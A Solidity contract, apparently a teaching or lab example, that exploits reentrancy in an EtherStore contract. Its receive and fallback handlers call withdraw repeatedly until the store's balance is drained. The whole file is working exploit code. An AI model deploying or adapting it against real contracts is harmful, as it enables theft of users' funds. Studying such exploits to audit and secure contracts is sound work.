// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IEtherStore} from "./IEtherstore.sol";

contract Attack {

    error NeedFundToAttack();

    IEtherStore public etherstore;

    constructor(address _etherstore) {
        etherstore = IEtherStore(_etherstore);
    }

    
    receive() external payable {
        if(address(etherstore).balance >= 1 ether) {
            etherstore.withdraw(1 ether);
        }
    }

    fallback() external payable {
        if(address(etherstore).balance >= 1 ether) {
            etherstore.withdraw(1 ether);
        }
    }


    function attack() external payable {
        if(msg.value < 1 ether) {
            revert NeedFundToAttack();
        }

        etherstore.deposit{value: 1 ether}();
        etherstore.withdraw(1 ether);
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}
